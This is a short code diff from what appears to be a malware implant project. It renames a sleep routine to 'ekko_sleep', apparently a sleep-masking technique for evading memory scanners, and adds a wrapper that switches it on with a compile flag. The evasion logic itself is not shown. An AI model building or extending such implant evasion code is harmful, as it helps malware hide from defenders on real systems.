@@ -5,7 +5,7 @@
 #include <sleep.hpp>
 
 void
-obfus::sleep(const uint32_t sleep_time) {
+obfus::ekko_sleep(const uint32_t sleep_time) {
 
     CONTEXT ctx_curthread   =   { 0 };
     CONTEXT ctx_protrw      =   { 0 };
@@ -133,6 +133,15 @@ obfus::sleep(const uint32_t sleep_time) {
     DeleteTimerQueue(hTimerQueue);
 }
 
+void
+obfus::sleep(const uint32_t sleep_time) {
+
+    #ifdef BAPHOMET_USE_SLEEPMASK
+        ekko_sleep(sleep_time);
+    #else
+        Sleep(sleep_time);
+    #endif
+}
 
 uint8_t*
 get_implant_base_address() {
